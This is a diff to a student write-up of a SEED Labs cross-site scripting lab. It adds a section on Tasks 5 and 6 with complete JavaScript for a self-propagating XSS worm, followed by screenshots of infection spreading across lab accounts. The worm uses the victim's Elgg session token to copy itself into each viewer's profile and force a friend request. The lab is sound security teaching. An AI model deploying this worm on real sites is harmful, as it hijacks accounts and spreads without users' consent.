@@ -150,8 +150,101 @@ After visiting Samy's profile:
 
 [![](images/img_xss_attack_task_4_6.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task_4_6.png)
 
-## Tasks 5
+## Tasks 5 & 6: Creating and Spreading the XSS Worm
 
-## Tasks 6
+In this task, we implement an XSS worm that automatically:
+
+ 1. Updates a victim’s profile to propagate itself.
+ 2. Adds Samy (user ID: 59) as a friend for any user who views the infected profile.
+
+```
+<script type="text/javascript" id="worm">
+window.onload = function(){
+  var headerTag = "<script id=\"worm\" type=\"text/javascript\">";  
+  var jsCode = document.getElementById("worm").innerHTML;
+  var tailTag = "</" + "script>";
+  
+  //Put it all together with URI encoding
+  var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
+  
+  //Set description field and access level
+  var desc = "&description=Samy is my Hero!" + wormCode;
+  desc += "&accesslevel[description]=2";
+  
+  //Get the name, guid, timestamp, and token
+  var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
+  var ts    = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
+  var name  = "&name=" + elgg.session.user.name;
+  var guid  = "&guid=" + elgg.session.user.guid;
+   
+  //Set the URL
+  var sendposturl = "http://www.seed-server.com/action/profile/edit";
+  var sendgeturl= "http://www.seed-server.com/action/friends/add" + "?friend=59" + token + ts;
+  var content = token + ts + name + desc + guid;
+  
+  //Construct and send the Ajax request
+  if (elgg.session.user.guid != 59){
+    //modify profile
+    var Ajax=null;
+    Ajax = new XMLHttpRequest();
+    Ajax.open("POST", sendposturl, true);
+    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    Ajax.send(content);
+  }
+ 
+  //Create and send Ajax request to add friend
+  Ajax=new XMLHttpRequest();
+  Ajax.open("GET", sendgeturl, true);
+  Ajax.send();
+ }
+ </script>
+```
+
+- Script Worm Injection in Profile
+
+[![](images/img_xss_attack_task5-6_1.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task5-6_1.png)
+
+- Boby's profile (Before views Samy's profile)
+
+[![](images/img_xss_attack_task5-6_2.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task5-6_2.png)
+
+- Boby's friend list (Before views Samy's profile)
+
+[![](images/img_xss_attack_task5-6_3.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task5-6_3.png)
+
+- Boby views Samy’s profile
+
+[![](images/img_xss_attack_task5-6_4.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task5-6_4.png)
+
+- Boby's profile (After views Samy's profile)
+
+[![](images/img_xss_attack_task5-6_5.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task5-6_5.png)
+
+- Boby's friend list (After views Samy's profile)
+
+[![](images/img_xss_attack_task5-6_6.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task5-6_6.png)
+
+- Alice's profile (Before views Boby's profile)
+
+[![](images/img_xss_attack_task5-6_7.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task5-6_7.png)
+
+- Alice's friend list (Before views Boby's profile)
+
+[![](images/img_xss_attack_task5-6_8.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task5-6_8.png)
+
+
+If the code is correct, a copy of the worm should have been placed in Boby’s profile. Now, when another user, like Charlie, visits Boby’s profile, the worm code will infect Charlie as well.
+
+- Alice views Boby’s profile
+
+[![](images/img_xss_attack_task5-6_9.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task5-6_9.png)
+
+- Alice's profile (After views Boby's profile)
+
+[![](images/img_xss_attack_task5-6_10.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task5-6_10.png)
+
+- Alice's friend list (After views Boby's profile)
+
+[![](images/img_xss_attack_task5-6_11.png)](https://github.com/tanasinp/SeedLab/tree/main/Web/xss_attack/images/img_xss_attack_task5-6_11.png)
 
 ## Tasks 7
